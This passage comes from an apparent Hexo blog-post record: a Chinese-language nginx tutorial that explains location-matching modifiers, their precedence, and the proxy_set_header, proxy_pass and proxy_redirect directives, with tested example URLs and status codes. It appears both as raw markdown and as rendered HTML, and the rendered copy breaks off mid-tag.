/t1/tt {\n       return 603;\n}\n```\nhttp://67.216.218.49:8080/t1/tt 603<br>\nhttp://67.216.218.49:8080/T1/TT 601\n\n- \\~\\*\n\n正则,大小写不敏感\n```\nlocation ~* /t1/tt {\n        return 601;\n}\nlocation ~* /T1/TT {\n        return 603;\n}\n```\n\n忽略大小写，按正则出现顺序开始匹配<br>\nhttp://67.216.218.49:8080/T1/TT 601<br>\nhttp://67.216.218.49:8080/t1/tt 601<br>\nhttp://67.216.218.49:8080/t1/TT 601<br>\nhttp://67.216.218.49:8080/t1/TT/tt/tt 601<br>\n\n- ^~\n\n表示匹配时，忽略正则\n```\nlocation ^~ /t1 {\n        return 601;\n}\nlocation  /t1tt {\n        return 603;\n}\n```\nhttp://67.216.218.49:8080/t1 601<br>\nhttp://67.216.218.49:8080/t1t 6011<br>\nhttp://67.216.218.49:8080/t1tt 6031<br>\nhttp://67.216.218.49:8080/t1ttt 6031<br>\n\n# 二.location 匹配顺序\n\n\n顺序: 先普通匹配，再正则匹配,中间注意的下面讲.<br>\n\n以 ~ 开头的为正则匹配，其余为普通匹配.<br>\n\n## 1.实例\n\n- 普通匹配中，先精确匹配\n\n```\nlocation ^~ /t1 {\n        return 601;\n}\nlocation = /t1 {\n        return 602;\n```\nhttp://67.216.218.49:8080/t1  602\n\n- 正则按顺序来\n\n```\nlocation ~* /t1{\n        return 601;\n}\nlocation ~* /t1tt {\n        return 603;\n}\n```\n\nhttp://67.216.218.49:8080/t1tt 601<br>\n```\nlocation ~* /t1ttt{\n        return 601;\n}\nlocation ~* /t1tt {\n        return 603;\n}\n```\nhttp://67.216.218.49:8080/t1ttt 601\n\n- 正则普通(最大前缀),先匹配普通，匹配到了，先记录下来，再匹配正则，匹配到了使用正则\n\n```\nlocation ~* /t1tt {\n       return 601;\n}\nlocation  /t1tt {\n       return 603;\n}\n```\nhttp://67.216.218.49:8080/t1tt 601<br>\nhttp://67.216.218.49:8080/t1ttt 601<br>\n\n\n- 正则和普通(^~),不使用正则，直接普通匹配\n\n```\nlocation ^~ /t1tt {\n        return 601;\n}\nlocation ~* /t1tt {\n        return 603;\n}\n```\n\nhttp://67.216.218.49:8080/t1tt 601\n\n- 正则和普通(精确匹配)，精确匹配到了，直接停止匹配\n\n```\nlocation ~* /t1tt {\n       return 601;\n}\nlocation  = /t1tt {\n       return 603;\n}\n```\nhttp://67.216.218.49:8080/t1tt 603<br>\n\n- 普通匹配中 ^~ 和 / 不能有重复的\n\n```\nlocation ^~ /t1t {\n       return 601;\n}\n#  false\n#location  /t1t {\n#       return 603;\n#}\n\nlocation  /t1 {\n       return 603;\n}\n\n```\nhttp://67.216.218.49:8080/t1t 601<br>\nhttp://67.216.218.49:8080/t1r  603\n\n\n## 2.顺序总结\n\n总结\n\n先精确匹配，匹配到了就使用<br>\n普通匹配，普通匹配时，选择匹配最长的(记录下来)，再进行正则匹配<br>\n正则匹配时，如果匹配成功且在普通匹配中不存在相应的^~ 使用正则匹配的结果，否则直接使用^~的结果（当普通匹配的最长前缀匹配有符号“^~”的时候，就不会在匹配正则），如果正则匹配不成功，使用普通匹配(最大前缀匹配)的结果\n\n\n\n## 3.注意问题\n\n- 1.url中/的使用注意,会进行匹配\n\n```\nlocation /t1tt/ {\n        return 601;\n}\n\nlocation ^~ /t1 {\n        return 603;\n}\n```\n\nhttp://67.216.218.49:8080/t1tt  603\n\n- 2.普通按照最长匹配\n\n```\nlocation /t1tt {\n        return 601;\n}\n\nlocation ^~ /t1 {\n        return 603;\n}\n```\nhttp://67.216.218.49:8080/t1tt  601\n\n- 3.正则使用时小心被覆盖\n\n/t1tt 被正则覆盖，导致访问不到, 实际遇到的问题之一<br>\n```\nlocation ~* /t1 {\n        return 601;\n}\nlocation  /t1tt {\n        return 603;\n}\n```\nhttp://67.216.218.49:8080/t1tt  601\n\n# 三.代理属性\n\n\n## 1. 请求头信息 proxy_set_header\n\n可设置请求头-并将头信息传递到服务器端。该值可以包含文本、变量和它们的组合<br>\n\nproxy_set_header field value 本质上就是把 header里面的 field字段 设置为想要的value.<br>\n\n- proxy_set_header Host $proxy_host;\n\n$proxy_host(默认值): 该代理nginx的ip\n- proxy_set_header Host $http_host;\n\n$http_host: 使用请求原host\n- proxy_set_header Host $host;\n\n$host: 如果客户端请求头中没有携带这个头部，那么传递到后端服务器的请求也不含这个头部。 这种情况下，更好的方式是使用$host变量——它的值在请求包含“Host”请求头时为“Host”字段的值，在请求未携带“Host”请求头时为虚拟主机的主域名<br>\n\n- proxy_set_header Host $host:$proxy_port;\n\n同理,proxy_set_header Host $host:$server_port<br>\n服务器名可以和后端服务器的端口一起传送<br>\n\n- proxy_set_header Host 127.0.0.1:8080;\n\n还可以不使用变量，直接写文本，或者变量加文本<br>\n\n- proxy_set_header X-Real-IP $remote_addr;\n\n其中这个X-real-ip是一个自定义的变量名，名字可以随意取，这样做完之后，用户的真实ip就被放在X-real-ip这个变量里了，然后，在web端可以这样获取：<br>\nrequest.getAttribute(\"X-real-ip\")<br>\n\n- proxy_set_header X-Forwarded-For $remote_addr;\n\n一层代理时,可以直接存入地址<br>\n- proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n\n多层代理时，可以存入代理链<br>\n每次经过proxy转发都会有记录,格式就是client1, proxy1, proxy2,以逗号隔开各个地址<br>\n\n\n## 2.代理 proxy_pass\n\n项目名: test, 路径 test<br>\n<strong>注意 / 在匹配中的作用 </strong><br>\n```\n# 1\nlocation  /test {\n      proxy_pass http://127.0.0.1:8002;\n}\n# 2\nlocation  /test/ {\n      proxy_pass http://127.0.0.1:8002;\n}\n# 3\nlocation  /test {\n      proxy_pass http://127.0.0.1:8002/;\n}\n# 4\nlocation  /test {\n      proxy_pass http://127.0.0.1:8002/test;\n}\n\n```\n\n使用 1 时<br>\nhttp://67.216.218.49:8080/test/test 200<br>\n使用 2 时<br>\nhttp://67.216.218.49:8080/test/test 200<br>\n使用 3 时<br>\nhttp://67.216.218.49:8080/test 200(tomcat页面)<br>\nhttp://67.216.218.49:8080/test/test  404<br>\nhttp://67.216.218.49:8080/test/test/test 200(接口返回)<br>\n使用 4 时<br>\n和 3 一样， 跳转时不会自动加上 location 中 url, 而是使用 proxy_pass 中 url<br>\n\n总结: 在匹配时，location中url后面加不加 / 没用影响，但是 proxy_pass 中 url 不加 / 会默认加上 location中url跳转， 加上 / 则不会带上 location中 url 跳转.<br>\n\n## 3.重定向 proxy_redirect\n\n当服务返回重定向时（http code为301或302），浏览器会根据response中的location字段进行跳转(浏览器直接跳转到服务地址).<br>\n此时，为了能让跳转经过nginx,可以使用 proxy_redirect 修改location的重定向信息.<br>\n\n```\n# 1 重定向到 其它location\nlocation /portal{\nproxy_set_header Host $host:$server_port;\nproxy_set_header X-Forwarded-For $remote_addr;\nproxy_set_header msec $msec;\nproxy_pass http://portal;\nindex index.html index.htm;\nproxy_redirect  http://10.191.21.105:8090/cas /cas;\nproxy_redirect  http://10.191.21.105:8090/portal  /portal;\n}\n\n# 2 重定向到具体地址\nlocation /cas{\nproxy_set_header Host $host:$server_port;\nproxy_set_header X-Forwarded-For $remote_addr;\nproxy_set_header msec $msec;\nproxy_pass http://cas;\nindex index.html index.htm;\nproxy_redirect  http://10.191.21.105:8090/portal  http://ip/port/path;\n...\n}\n```\n","source":"_posts/tools/nginx/location模块.md","raw":"---\ntitle: location模块\ndate: 2019-07-19 14:54:32\ntags: [tools]\n---\n\n测试所用版本:\n```\nroot@localhost:~# nginx -v\nnginx version: nginx/1.10.3 (Ubuntu)\n```\n# 一. Location表达式\n\n <strong> location [ = | \\~ | \\~\\* | ^~ | @ ] /uri/ { … } </strong>\n- /{}\n\n  无前缀，表示最大前缀匹配.\n\n- @\n\n  几乎见不到，不用管\n\n- =\n\n 完全匹配<br>\n url部分为啥就精确匹配啥.\n\n\n ```\n# 1\nlocation = /t1 {\n      return 601;\n}\n# 2\nlocation = /t2 {\n        return 602;\n}\n# 3\nlocation = /t1/ {\n        return 603;\n}\n ```\n 例子:<br>\nhttp://67.216.218.49:8080/t1 601\n\nhttp://67.216.218.49:8080/t2 602\n\nhttp://67.216.218.49:8080/t 404\n\n加上条件3前<br>\nhttp://67.216.218.49:8080/t1/ 404<br>\n加上条件3后<br>\nhttp://67.216.218.49:8080/t1/ 603\n\n- \\~\n\n正则,大小写敏感\n```\nlocation ~ /T1 {\n       return 601;\n}\nlocation ~ /t1 {\n       return 603;\n}\n```\nhttp://67.216.218.49:8080/t1 603<br>\n自动转为了 小写?<br>\nhttp://67.216.218.49:8080/T1 603\n\n```\nlocation ~ /T1/TT {\n       return 601;\n}\nlocation ~ /t1/tt {\n       return 603;\n}\n```\nhttp://67.216.218.49:8080/t1/tt 603<br>\nhttp://67.216.218.49:8080/T1/TT 601\n\n- \\~\\*\n\n正则,大小写不敏感\n```\nlocation ~* /t1/tt {\n        return 601;\n}\nlocation ~* /T1/TT {\n        return 603;\n}\n```\n\n忽略大小写，按正则出现顺序开始匹配<br>\nhttp://67.216.218.49:8080/T1/TT 601<br>\nhttp://67.216.218.49:8080/t1/tt 601<br>\nhttp://67.216.218.49:8080/t1/TT 601<br>\nhttp://67.216.218.49:8080/t1/TT/tt/tt 601<br>\n\n- ^~\n\n表示匹配时，忽略正则\n```\nlocation ^~ /t1 {\n        return 601;\n}\nlocation  /t1tt {\n        return 603;\n}\n```\nhttp://67.216.218.49:8080/t1 601<br>\nhttp://67.216.218.49:8080/t1t 6011<br>\nhttp://67.216.218.49:8080/t1tt 6031<br>\nhttp://67.216.218.49:8080/t1ttt 6031<br>\n\n# 二.location 匹配顺序\n\n\n顺序: 先普通匹配，再正则匹配,中间注意的下面讲.<br>\n\n以 ~ 开头的为正则匹配，其余为普通匹配.<br>\n\n## 1.实例\n\n- 普通匹配中，先精确匹配\n\n```\nlocation ^~ /t1 {\n        return 601;\n}\nlocation = /t1 {\n        return 602;\n```\nhttp://67.216.218.49:8080/t1  602\n\n- 正则按顺序来\n\n```\nlocation ~* /t1{\n        return 601;\n}\nlocation ~* /t1tt {\n        return 603;\n}\n```\n\nhttp://67.216.218.49:8080/t1tt 601<br>\n```\nlocation ~* /t1ttt{\n        return 601;\n}\nlocation ~* /t1tt {\n        return 603;\n}\n```\nhttp://67.216.218.49:8080/t1ttt 601\n\n- 正则普通(最大前缀),先匹配普通，匹配到了，先记录下来，再匹配正则，匹配到了使用正则\n\n```\nlocation ~* /t1tt {\n       return 601;\n}\nlocation  /t1tt {\n       return 603;\n}\n```\nhttp://67.216.218.49:8080/t1tt 601<br>\nhttp://67.216.218.49:8080/t1ttt 601<br>\n\n\n- 正则和普通(^~),不使用正则，直接普通匹配\n\n```\nlocation ^~ /t1tt {\n        return 601;\n}\nlocation ~* /t1tt {\n        return 603;\n}\n```\n\nhttp://67.216.218.49:8080/t1tt 601\n\n- 正则和普通(精确匹配)，精确匹配到了，直接停止匹配\n\n```\nlocation ~* /t1tt {\n       return 601;\n}\nlocation  = /t1tt {\n       return 603;\n}\n```\nhttp://67.216.218.49:8080/t1tt 603<br>\n\n- 普通匹配中 ^~ 和 / 不能有重复的\n\n```\nlocation ^~ /t1t {\n       return 601;\n}\n#  false\n#location  /t1t {\n#       return 603;\n#}\n\nlocation  /t1 {\n       return 603;\n}\n\n```\nhttp://67.216.218.49:8080/t1t 601<br>\nhttp://67.216.218.49:8080/t1r  603\n\n\n## 2.顺序总结\n\n总结\n\n先精确匹配，匹配到了就使用<br>\n普通匹配，普通匹配时，选择匹配最长的(记录下来)，再进行正则匹配<br>\n正则匹配时，如果匹配成功且在普通匹配中不存在相应的^~ 使用正则匹配的结果，否则直接使用^~的结果（当普通匹配的最长前缀匹配有符号“^~”的时候，就不会在匹配正则），如果正则匹配不成功，使用普通匹配(最大前缀匹配)的结果\n\n\n\n## 3.注意问题\n\n- 1.url中/的使用注意,会进行匹配\n\n```\nlocation /t1tt/ {\n        return 601;\n}\n\nlocation ^~ /t1 {\n        return 603;\n}\n```\n\nhttp://67.216.218.49:8080/t1tt  603\n\n- 2.普通按照最长匹配\n\n```\nlocation /t1tt {\n        return 601;\n}\n\nlocation ^~ /t1 {\n        return 603;\n}\n```\nhttp://67.216.218.49:8080/t1tt  601\n\n- 3.正则使用时小心被覆盖\n\n/t1tt 被正则覆盖，导致访问不到, 实际遇到的问题之一<br>\n```\nlocation ~* /t1 {\n        return 601;\n}\nlocation  /t1tt {\n        return 603;\n}\n```\nhttp://67.216.218.49:8080/t1tt  601\n\n# 三.代理属性\n\n\n## 1. 请求头信息 proxy_set_header\n\n可设置请求头-并将头信息传递到服务器端。该值可以包含文本、变量和它们的组合<br>\n\nproxy_set_header field value 本质上就是把 header里面的 field字段 设置为想要的value.<br>\n\n- proxy_set_header Host $proxy_host;\n\n$proxy_host(默认值): 该代理nginx的ip\n- proxy_set_header Host $http_host;\n\n$http_host: 使用请求原host\n- proxy_set_header Host $host;\n\n$host: 如果客户端请求头中没有携带这个头部，那么传递到后端服务器的请求也不含这个头部。 这种情况下，更好的方式是使用$host变量——它的值在请求包含“Host”请求头时为“Host”字段的值，在请求未携带“Host”请求头时为虚拟主机的主域名<br>\n\n- proxy_set_header Host $host:$proxy_port;\n\n同理,proxy_set_header Host $host:$server_port<br>\n服务器名可以和后端服务器的端口一起传送<br>\n\n- proxy_set_header Host 127.0.0.1:8080;\n\n还可以不使用变量，直接写文本，或者变量加文本<br>\n\n- proxy_set_header X-Real-IP $remote_addr;\n\n其中这个X-real-ip是一个自定义的变量名，名字可以随意取，这样做完之后，用户的真实ip就被放在X-real-ip这个变量里了，然后，在web端可以这样获取：<br>\nrequest.getAttribute(\"X-real-ip\")<br>\n\n- proxy_set_header X-Forwarded-For $remote_addr;\n\n一层代理时,可以直接存入地址<br>\n- proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n\n多层代理时，可以存入代理链<br>\n每次经过proxy转发都会有记录,格式就是client1, proxy1, proxy2,以逗号隔开各个地址<br>\n\n\n## 2.代理 proxy_pass\n\n项目名: test, 路径 test<br>\n<strong>注意 / 在匹配中的作用 </strong><br>\n```\n# 1\nlocation  /test {\n      proxy_pass http://127.0.0.1:8002;\n}\n# 2\nlocation  /test/ {\n      proxy_pass http://127.0.0.1:8002;\n}\n# 3\nlocation  /test {\n      proxy_pass http://127.0.0.1:8002/;\n}\n# 4\nlocation  /test {\n      proxy_pass http://127.0.0.1:8002/test;\n}\n\n```\n\n使用 1 时<br>\nhttp://67.216.218.49:8080/test/test 200<br>\n使用 2 时<br>\nhttp://67.216.218.49:8080/test/test 200<br>\n使用 3 时<br>\nhttp://67.216.218.49:8080/test 200(tomcat页面)<br>\nhttp://67.216.218.49:8080/test/test  404<br>\nhttp://67.216.218.49:8080/test/test/test 200(接口返回)<br>\n使用 4 时<br>\n和 3 一样， 跳转时不会自动加上 location 中 url, 而是使用 proxy_pass 中 url<br>\n\n总结: 在匹配时，location中url后面加不加 / 没用影响，但是 proxy_pass 中 url 不加 / 会默认加上 location中url跳转， 加上 / 则不会带上 location中 url 跳转.<br>\n\n## 3.重定向 proxy_redirect\n\n当服务返回重定向时（http code为301或302），浏览器会根据response中的location字段进行跳转(浏览器直接跳转到服务地址).<br>\n此时，为了能让跳转经过nginx,可以使用 proxy_redirect 修改location的重定向信息.<br>\n\n```\n# 1 重定向到 其它location\nlocation /portal{\nproxy_set_header Host $host:$server_port;\nproxy_set_header X-Forwarded-For $remote_addr;\nproxy_set_header msec $msec;\nproxy_pass http://portal;\nindex index.html index.htm;\nproxy_redirect  http://10.191.21.105:8090/cas /cas;\nproxy_redirect  http://10.191.21.105:8090/portal  /portal;\n}\n\n# 2 重定向到具体地址\nlocation /cas{\nproxy_set_header Host $host:$server_port;\nproxy_set_header X-Forwarded-For $remote_addr;\nproxy_set_header msec $msec;\nproxy_pass http://cas;\nindex index.html index.htm;\nproxy_redirect  http://10.191.21.105:8090/portal  http://ip/port/path;\n...\n}\n```\n","slug":"tools/nginx/location模块","published":1,"updated":"2019-10-13T12:15:12.184Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321ls004y6dcpex2pig9t","content":"<p>测试所用版本:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@localhost:~# nginx -v</span><br><span class=\"line\">nginx version: nginx/1.10.3 (Ubuntu)</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"一-Location表达式\"><a href=\"#一-Location表达式\" class=\"headerlink\" title=\"一. Location表达式\"></a>一. Location表达式</h1><p> <strong> location [ = | ~ | ~* | ^~ | @ ] /uri/ { … } </strong></p>\n<ul>\n<li><p>/{}</p>\n<p>无前缀，表示最大前缀匹配.</p>\n</li>\n<li><p>@</p>\n<p>几乎见不到，不用管</p>\n</li>\n<li><p>=</p>\n<p>完全匹配<br><br>url部分为啥就精确匹配啥.</p>\n</li>\n</ul>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 1</span><br><span class=\"line\">location = /t1 &#123;</span><br><span class=\"line\">      return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># 2</span><br><span class=\"line\">location = /t2 &#123;</span><br><span class=\"line\">        return 602;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># 3</span><br><span class=\"line\">location = /t1/ &#123;</span><br><span class=\"line\">        return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p> 例子:<br><br><a href=\"http://67.216.218.49:8080/t1\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1</a> 601</p>\n<p><a href=\"http://67.216.218.49:8080/t2\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t2</a> 602</p>\n<p><a href=\"http://67.216.218.49:8080/t\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t</a> 404</p>\n<p>加上条件3前<br><br><a href=\"http://67.216.218.49:8080/t1/\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1/</a> 404<br><br>加上条件3后<br><br><a href=\"http://67.216.218.49:8080/t1/\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1/</a> 603</p>\n<ul>\n<li>~</li>\n</ul>\n<p>正则,大小写敏感<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ /T1 &#123;</span><br><span class=\"line\">       return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location ~ /t1 &#123;</span><br><span class=\"line\">       return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://67.216.218.49:8080/t1\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1</a> 603<br><br>自动转为了 小写?<br><br><a href=\"http://67.216.218.49:8080/T1\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/T1</a> 603</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ /T1/TT &#123;</span><br><span class=\"line\">       return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location ~ /t1/tt &#123;</span><br><span class=\"line\">       return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://67.216.218.49:8080/t1/tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1/tt</a> 603<br><br><a href=\"http://67.216.218.49:8080/T1/TT\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/T1/TT</a> 601</p>\n<ul>\n<li>~*</li>\n</ul>\n<p>正则,大小写不敏感<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~* /t1/tt &#123;</span><br><span class=\"line\">        return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location ~* /T1/TT &#123;</span><br><span class=\"line\">        return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>忽略大小写，按正则出现顺序开始匹配<br><br><a href=\"http://67.216.218.49:8080/T1/TT\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/T1/TT</a> 601<br><br><a href=\"http://67.216.218.49:8080/t1/tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1/tt</a> 601<br><br><a href=\"http://67.216.218.49:8080/t1/TT\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1/TT</a> 601<br><br><a href=\"http://67.216.218.49:8080/t1/TT/tt/tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1/TT/tt/tt</a> 601<br></p>\n<ul>\n<li>^~</li>\n</ul>\n<p>表示匹配时，忽略正则<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ^~ /t1 &#123;</span><br><span class=\"line\">        return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location  /t1tt &#123;</span><br><span class=\"line\">        return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://67.216.218.49:8080/t1\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1</a> 601<br><br><a href=\"http://67.216.218.49:8080/t1t\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1t</a> 6011<br><br><a href=\"http://67.216.218.49:8080/t1tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1tt</a> 6031<br><br><a href=\"http://67.216.218.49:8080/t1ttt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1ttt</a> 6031<br></p>\n<h1 id=\"二-location-匹配顺序\"><a href=\"#二-location-匹配顺序\" class=\"headerlink\" title=\"二.location 匹配顺序\"></a>二.location 匹配顺序</h1><p>顺序: 先普通匹配，再正则匹配,中间注意的下面讲.<br></p>\n<p>以 ~ 开头的为正则匹配，其余为普通匹配.<br></p>\n<h2 id=\"1-实例\"><a href=\"#1-实例\" class=\"headerlink\" title=\"1.实例\"></a>1.实例</h2><ul>\n<li>普通匹配中，先精确匹配</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ^~ /t1 &#123;</span><br><span class=\"line\">        return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location = /t1 &#123;</span><br><span class=\"line\">        return 602;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://67.216.218.49:8080/t1\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1</a>  602</p>\n<ul>\n<li>正则按顺序来</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~* /t1&#123;</span><br><span class=\"line\">        return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location ~* /t1tt &#123;</span><br><span class=\"line\">        return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://67.216.218.49:8080/t1tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1tt</a> 601<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~* /t1ttt&#123;</span><br><span class=\"line\">        return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location ~* /t1tt &#123;</span><br><span class=\"line\">        return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://67.216.218.49:8080/t1ttt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1ttt</a> 601</p>\n<ul>\n<li>正则普通(最大前缀),先匹配普通，匹配到了，先记录下来，再匹配正则，匹配到了使用正则</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~* /t1tt &#123;</span><br><span class=\"line\">       return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location  /t1tt &#123;</span><br><span class=\"line\">       return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://67.216.218.49:8080/t1tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1tt</a> 601<br><br><a href=\"http://67.216.218.49:8080/t1ttt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1ttt</a> 601<br></p>\n<ul>\n<li>正则和普通(^~),不使用正则，直接普通匹配</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ^~ /t1tt &#123;</span><br><span class=\"line\">        return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location ~* /t1tt &#123;</span><br><span class=\"line\">        return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://67.216.218.49:8080/t1tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1tt</a> 601</p>\n<ul>\n<li>正则和普通(精确匹配)，精确匹配到了，直接停止匹配</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~* /t1tt &#123;</span><br><span class=\"line\">       return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location  = /t1tt &#123;</span><br><span class=\"line\">       return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://67.216.218.49:8080/t1tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1tt</a> 603<br></p>\n<ul>\n<li>普通匹配中 ^~ 和 / 不能有重复的</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ^~ /t1t &#123;</span><br><span class=\"line\">       return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#  false</span><br><span class=\"line\">#location  /t1t &#123;</span><br><span class=\"line\">#       return 603;</span><br><span class=\"line\">#&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">location  /t1 &#123;</span><br><span class=\"line\">       return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://67.216.218.49:8080/t1t\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1t</a> 601<br><br><a href=\"http://67.216.218.49:8080/t1r\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1r</a>  603</p>\n<h2 id=\"2-顺序总结\"><a href=\"#2-顺序总结\" class=\"headerlink\" title=\"2.顺序总结\"></a>2.顺序总结</h2><p>总结</p>\n<p>先精确匹配，匹配到了就使用<br><br>普通匹配，普通匹配时，选择匹配最长的(记录下来)，再进行正则匹配<br><br>正则匹配时，如果匹配成功且在普通匹配中不存在相应的^~ 使用正则匹配的结果，否则直接使用^~的结果（当普通匹配的最长前缀匹配有符号“^~”的时候，就不会在匹配正则），如果正则匹配不成功，使用普通匹配(最大前缀匹配)的结果</p>\n<h2 id=\"3-注意问题\"><a href=\"#3-注意问题\" class=\"headerlink\" 